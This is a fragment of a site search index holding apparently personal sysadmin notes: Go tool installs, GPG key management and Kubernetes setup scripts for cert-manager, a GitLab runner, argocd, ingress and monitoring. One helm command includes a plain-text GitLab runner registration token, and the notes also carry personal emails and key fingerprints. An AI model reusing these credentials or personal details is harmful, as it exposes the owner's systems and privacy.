style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebrew install hey\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"slides\"\u003eslides\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eTerminal based presentation tool\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebrew install slides\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/maaslalani/slides@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"gokart\"\u003egokart\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eA static analysis tool for securing Go code\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/praetorian-inc/gokart@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"structslop\"\u003estructslop\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003estructslop is a static analyzer for Go that recommends struct field rearrangements to provide for maximum space/allocation efficiency.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install -v github.com/orijtech/structslop/cmd/structslop@v0.0.8\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego get github.com/orijtech/structslop/cmd/structslop\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"dive\"\u003edive\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eA tool for exploring each layer in a docker image\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebrew install dive\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego get github.com/wagoodman/dive\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"sttr\"\u003esttr\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003ecross-platform, cli app to perform various operations on string\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/abhimanyu003/sttr@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"gentool\"\u003egentool\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eGen Tool is a single binary without dependencies can be used to generate structs from database\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install gorm.io/gen/tools/gentool@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"wire\"\u003ewire\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/google/wire/cmd/wire@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"ko\"\u003eko\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eBuild and deploy Go applications\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/google/ko@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"talisman\"\u003eTalisman\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003eA tool to detect and prevent secrets from getting checked in\u003c/p\u003e","tags":null,"title":"Go Tools"},{"categories":null,"contents":" Install brew install gnupg Generate gpg --full-generate-key gpg --list-secret-keys Generate Problem $ gpg --full-generate-key gpg: Sorry, no terminal at all requested - can\u0026#39;t get input Comment out no-tty in ~/.gnupg/gpg.conf\nAdd to git gpg --armor --export 51ADF7101CA64B2508AE29EEC279555531A1DD62 Set .gitconfig git config user.email zeyanlin@outlook.com git config user.name Ricky git config user.signingkey 51ADF7101CA64B2508AE29EEC279555531A1DD62 git config commit.gpgsign true Delete key gpg --delete-secret-keys 51ADF7101CA64B2508AE29EEC279555531A1DD62 Backup key # https://www.jwillikers.com/backup-and-restore-a-gpg-key gpg --list-secret-keys --keyid-format LONG # Export key as a file, replace email-address and Enter the private key’s passphrase gpg -o private.gpg --export-options backup --export-secret-keys rickylin@cloud-miner.net # Restore key and enter the private key’s passphrase gpg --import-options restore --import private.gpg If GPG not work echo \u0026#39;export GPG_TTY=$(tty)\u0026#39; \u0026gt;\u0026gt; ~/.zshrc gpgconf –kill gpg-agent exec $SHELL Encrypt file # Encrypt file gpg --symmetric --cipher-algo aes256 archive_file.tar # Decrypt file gpg --output archive_file.tar --decrypt archive_file.tar.gpg ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/gpg/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eInstall\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebrew install gnupg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eGenerate\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --full-generate-key\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --list-secret-keys\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eGenerate Problem\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ gpg --full-generate-key\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg: Sorry, no terminal at all requested - can\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u0026#39;\u003c/span\u003et get input\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eComment out no-tty in \u003ccode\u003e~/.gnupg/gpg.conf\u003c/code\u003e\u003c/p\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eAdd to git\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --armor --export 51ADF7101CA64B2508AE29EEC279555531A1DD62\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSet .gitconfig\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config user.email zeyanlin@outlook.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config user.name Ricky\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config user.signingkey 51ADF7101CA64B2508AE29EEC279555531A1DD62\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config commit.gpgsign true\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eDelete key\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --delete-secret-keys 51ADF7101CA64B2508AE29EEC279555531A1DD62\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eBackup key\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# https://www.jwillikers.com/backup-and-restore-a-gpg-key\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --list-secret-keys --keyid-format LONG\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Export key as a file, replace email-address and Enter the private key’s passphrase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg -o private.gpg --export-options backup --export-secret-keys rickylin@cloud-miner.net\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Restore key and enter the private key’s passphrase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --import-options restore --import private.gpg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eIf GPG not work\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;export GPG_TTY=$(tty)\u0026#39;\u003c/span\u003e \u0026gt;\u0026gt; ~/.zshrc\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpgconf –kill gpg-agent\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexec $SHELL\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eEncrypt file\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Encrypt file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --symmetric --cipher-algo aes256 archive_file.tar\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Decrypt file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egpg --output archive_file.tar --decrypt archive_file.tar.gpg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"GPG Command"},{"categories":null,"contents":" cert-manager cert-manager Route53 IAM Role Cert Manager Resource Cert Generate Resource Cert Ingress Resource # install the cert-manager CustomResourceDefinition resources kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.13.1/cert-manager.crds.yaml # Add the Jetstack Helm repository helm repo add jetstack https://charts.jetstack.io helm repo update # install the cert-manager helm chart helm install \\ cert-manager jetstack/cert-manager \\ --namespace cert-manager \\ --create-namespace \\ --version v1.13.1 \\ --set installCRDs=true --set prometheus.enabled=false \\ --set webhook.timeoutSeconds=4 # uninstalling helm delete my-release kubectl delete -f https://github.com/cert-manager/cert-manager/releases/download/v1.13.1/cert-manager.crds.yaml # create clusterissuer kubectl apply -f cert-manager-resource.yaml # generate certificate kubectl apply -f cert-generate-resource.yaml # create ingress controller kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.8.2/deploy/static/provider/cloud/deploy.yaml # create ingress kubectl apply -f cert-ingress-resource.yaml helm # install plugin helm plugin install https://github.com/chartmuseum/helm-push.git # add repo ## helm repo add --username gitlab-ci-token --password ${CI_JOB_TOKEN} ${CI_PROJECT_NAME} ${CI_API_V4_URL}/projects/${CI_PROJECT_ID}/packages/helm/stable helm repo add go2helm https://gitlab.go2cloudten.com/api/v4/projects/29/packages/helm/stable --username ricky # push chart ## https://docs.gitlab.com/ee/user/packages/helm_repository/ helm cm-push ./proxy-0.1.0.tgz go2helm kompose kompose --file docker-compose.yml convert gitlab-runner link\ngitlab-admin-service-account.yaml # CA Certificate kubectl get secret $(kubectl get secret | grep default | awk \u0026#39;{print $1}\u0026#39;) -o jsonpath=\u0026#34;{[\u0026#39;data\u0026#39;][\u0026#39;ca\\.crt\u0026#39;]}\u0026#34; | base64 --decode # Service Token kubectl apply -f gitlab-admin-service-account.yaml kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep gitlab | awk \u0026#39;{print $1}\u0026#39;) # https://gitlab.com/gitlab-org/charts/gitlab-runner/blob/master/values.yaml echo | openssl s_client -CAfile ca.crt -connect gitlab.knowhow.it:443 \u0026gt; /tmp/certs/server.pem # Install gitlab-runner from gitlab helm repo add gitlab https://charts.gitlab.io kubectl create namespace gitlab kubectl --namespace gitlab create secret generic gitlab-certs --from-file=gitlab.knowhow.it.crt=/tmp/certs/server.pem --from-file=registry.knowhow.it.crt=/tmp/certs/server.pem helm install --namespace gitlab k8srunner --set gitlabUrl=https://gitlab.knowhow.it,runnerRegistrationToken=VmyYjzmU_FjqyMJNJxJK,certsSecretName=gitlab-certs,rbac.create=true,runners.privileged=true,runners.tags=k8s,runners.image=alpine:3.12,runners.locked=false gitlab/gitlab-runner k3d k3d.yaml # create cluster k3d cluster create --config k3d.yaml # delete cluster k3d cluster delete local # import image k3d image import superapp -c local kind kind.yaml # create cluster kind create cluster --config kind.yaml # delete cluster kind delete cluster -n local # import image kind load docker-image superapp -n local rancher #!/usr/bin/env bash docker run \\ -d \\ --restart=always \\ --name rancher \\ --network=host \\ -v /etc/ssl/server.crt:/etc/rancher/ssl/cert.pem \\ -v /etc/ssl/server.key:/etc/rancher/ssl/key.pem \\ -v /etc/ssl/ca.crt:/etc/rancher/ssl/cacerts.pem \\ --privileged \\ rancher/rancher:latest skaffold #!/usr/bin/env bash # https://github.com/GoogleContainerTools/skaffold/examples/getting-started curl -Lo skaffold https://storage.googleapis.com/skaffold/releases/latest/skaffold-linux-amd64 \u0026amp;\u0026amp; \\ sudo install skaffold /usr/local/bin/ k8s in k8s #!/usr/bin/env bash ## Install kubernetes-in-kubernetes helm repo add kvaps https://kvaps.github.io/charts helm install kik kvaps/kubernetes --version 0.13.4 \\ --namespace kik \\ --create-namespace \\ --set persistence.storageClassName=local-path argocd #!/usr/bin/env bash nameSpace=\u0026#39;argocd\u0026#39; port=8443 ## helm ## https://github.com/argoproj/argo-helm/tree/master/charts/argo-cd helm repo add argo https://argoproj.github.io/argo-helm helm repo update helm install argocd argo/argo-cd \\ --namespace ${nameSpace} --create-namespace \\ --set server.service.type=NodePort \\ --set server.service.nodePortHttps=${port} ## kubectl # kubectl create namespace ${nameSpace} # kubectl apply -n ${nameSpace} -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml # sleep 60 # kubectl apply -f - \u0026lt;\u0026lt;SVC # apiVersion: v1 # kind: Service # metadata: # labels: # app.kubernetes.io/component: server # app.kubernetes.io/name: argocd-server # app.kubernetes.io/part-of: argocd # name: argocd-server # namespace: ${nameSpace} # spec: # type: NodePort # selector: # app.kubernetes.io/name: argocd-server # ports: # - name: https # nodePort: ${port} # port: 443 # targetPort: 8080 # SVC if ! which argocd 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null; then wget https://github.com/argoproj/argo-cd/releases/download/v2.1.7/argocd-linux-amd64 chmod 755 argocd-linux-amd64 mv argocd-linux-amd64 /usr/local/bin/argocd fi sleep 120 account=\u0026#39;admin\u0026#39; password=$(kubectl -n ${nameSpace} get secret argocd-initial-admin-secret -o jsonpath=\u0026#34;{.data.password}\u0026#34; | base64 -d) echo ${account} echo ${password} ## CLI # argocd login https://192.168.185.95:6443 # argocd app create guestbook --repo https://github.com/argoproj/argocd-example-apps.git --path guestbook --dest-server https://kubernetes.default.svc --dest-namespace default delete() { kubectl delete clusterrole argocd-application-controller ; kubectl delete clusterrole argocd-server kubectl delete clusterrolebindings argocd-application-controller ; kubectl delete clusterrolebindings argocd-server } cert manager #!/usr/bin/env bash ## Install cert-manager ## https://cert-manager.io/docs/installation/ helm repo add jetstack https://charts.jetstack.io helm install \\ cert-manager jetstack/cert-manager \\ --namespace cert-manager \\ --create-namespace \\ --version v1.7.2 \\ --set installCRDs=true \\ --set prometheus.enabled=false \\ --set webhook.timeoutSeconds=4 cilium #!/usr/bin/env bash set -eux use_cli() { curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-darwin-amd64.tar.gz{,.sha256sum} shasum -a 256 -c cilium-darwin-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-darwin-amd64.tar.gz /usr/local/bin rm cilium-darwin-amd64.tar.gz{,.sha256sum} cilium install } helm install cilium cilium/cilium --version 1.11.0 \\ --namespace kube-system ingress #!/usr/bin/env bash ingressClass=\u0026#39;nginx\u0026#39; ingressFile=\u0026#39;/tmp/ing.yaml\u0026#39; ingressIP=\u0026#39;192.168.185.109\u0026#39; ingressName=\u0026#39;proxy\u0026#39; ingressSuffix=\u0026#39;ingress-nginx\u0026#39; nameSpace=\u0026#39;ingress\u0026#39; nginxRepo=\u0026#39;ingress-nginx\u0026#39; replica=0 if [[ \u0026#34;$1\u0026#34; == \u0026#34;delete\u0026#34; ]]; then # Delete kubectl delete namespace ${nameSpace} kubectl delete IngressClass ${ingressClass} # kubectl delete ValidatingWebhookConfiguration ${ingressName}-ingress-nginx-admission exit $? fi if ! $(helm repo list | grep ${nginxRepo} \u0026gt;/dev/null); then echo \u0026#34;Install ${nginxRepo}\u0026#34; helm repo add ${nginxRepo} https://kubernetes.github.io/ingress-nginx helm repo update fi # --set controller.autoscaling.enabled=true \\ # --set controller.autoscaling.maxReplicas=9 \\ # --set controller.metrics.enabled=true \\ helm install ${ingressName} ${nginxRepo}/${ingressSuffix} \\ --namespace ${nameSpace} --create-namespace \\ --set controller.ingressClass=${ingressClass} \\ --set controller.replicaCount=${replica} \\ --set controller.service.externalTrafficPolicy=Local # --set controller.publishService.enabled=true # --set controller.defaultBackend.port=443 \\ # --set controller.hostNetwork=true \\ # --set controller.kind=DaemonSet \\ # --set controller.daemonset.useHostPorts=true \\ # --set controller.service.loadBalancerIP=${ingressIP} clusertIP=$(kubectl -n ingress get service | awk \u0026#39;NR==2{print $3}\u0026#39;) cat \u0026lt;\u0026lt;-EOF \u0026gt;${ingressFile} # apiVersion: v1 # kind: Service # metadata: # name: ${ingressName}-${ingressSuffix} # spec: # clusterIP: ${clusertIP} # externalIPs: # - ${ingressIP} # externalTrafficPolicy: Local # selector: # app: proxy-nginx-ingress # ports: # - name: https # port: 443 # targetPort: 443 # type: LoadBalancer # status: # loadBalancer: # ingress: # - ip: ${ingressIP} # \\-\\-\\- # kind: Endpoints # apiVersion: v1 # metadata: # name: ${ingressName}-${ingressSuffix} # subsets: # - addresses: # - ip: 54.238.209.164 # ports: # - name: https # port: 443 # - name: ssh # port: 22 \\-\\-\\- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: ingress annotations: kubernetes.io/ingress.class: ${ingressClass} nginx.ingress.kubernetes.io/upstream-vhost: own.go2cloudten.com nginx.ingress.kubernetes.io/backend-protocol: \u0026#34;HTTPS\u0026#34; nginx.ingress.kubernetes.io/default-backend: ${ingressName}-${ingressSuffix}-controller nginx.ingress.kubernetes.io/http2-push-preload: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/service-upstream: \u0026#34;true\u0026#34; # nginx.ingress.kubernetes.io/rewrite-target: / spec: # defaultBackend: # service: # name: ${ingressName}-${ingressSuffix} # port: # number: 443 rules: - host: gitlab.go2cloudten.com http: paths: - path: /* pathType: Prefix backend: service: name: ${ingressName}-${ingressSuffix} port: number: 443 # - path: /* # pathType: Prefix # backend: # service: # name: ${ingressName}-${ingressSuffix} # port: # name: ssh EOF # kubectl -n ingress apply -f ${ingressFile} krew #!/usr/bin/env bash set -x cd \u0026#34;$(mktemp -d)\u0026#34; \u0026amp;\u0026amp; OS=\u0026#34;$(uname | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39;)\u0026#34; \u0026amp;\u0026amp; ARCH=\u0026#34;$(uname -m | sed -e \u0026#39;s/x86_64/amd64/\u0026#39; -e \u0026#39;s/\\(arm\\)\\(64\\)\\?.*/\\1\\2/\u0026#39; -e \u0026#39;s/aarch64$/arm64/\u0026#39;)\u0026#34; \u0026amp;\u0026amp; KREW=\u0026#34;krew-${OS}_${ARCH}\u0026#34; \u0026amp;\u0026amp; curl -fsSLO \u0026#34;https://github.com/kubernetes-sigs/krew/releases/latest/download/${KREW}.tar.gz\u0026#34; \u0026amp;\u0026amp; tar zxvf \u0026#34;${KREW}.tar.gz\u0026#34; \u0026amp;\u0026amp; ./\u0026#34;${KREW}\u0026#34; install krew export PATH=\u0026#34;${KREW_ROOT:-$HOME/.krew}/bin:$PATH\u0026#34; kubectl krew install change-ns kubectl change-ns nginx prometheus #!/usr/bin/env bash nameSpace=\u0026#39;monitoring\u0026#39; prometheusPort=9090 grafanaPort=3000 kubeControllerManagerDefaultPort=10257 ## helm ## https://github.com/prometheus-community/helm-charts/tree/main/charts/kube-prometheus-stack ## 1. monitoring every namespaces and export port ## 2. export grafana port ## 3. monitoring kubeControllerManager helm repo add prometheus-community https://prometheus-community.github.io/helm-charts helm repo update helm install kube-prometheus-stack prometheus-community/kube-prometheus-stack \\ --namespace \u0026#34;${nameSpace}\u0026#34; \\ --create-namespace \\ --set prometheus.prometheusSpec.podMonitorSelectorNilUsesHelmValues=false \\ --set prometheus.prometheusSpec.ruleSelectorNilUsesHelmValues=false \\ --set prometheus.prometheusSpec.serviceMonitorSelectorNilUsesHelmValues=false \\ --set prometheus.service.type=NodePort \\ --set prometheus.service.nodePort=${prometheusPort} \\ --set grafana.service.type=NodePort \\ --set grafana.service.nodePort=${grafanaPort} \\ --set kubeControllerManager.service.port=${kubeControllerManagerDefaultPort} \\ --set kubeControllerManager.service.targetPort=${kubeControllerManagerDefaultPort} \\ --set kubeControllerManager.ServiceMonitor.https=true \\ --set kubeControllerManager.ServiceMonitor.insecureSkipVerify=true \\ --set kubeControllerManager.ServiceMonitor.serverName=localhost sleep 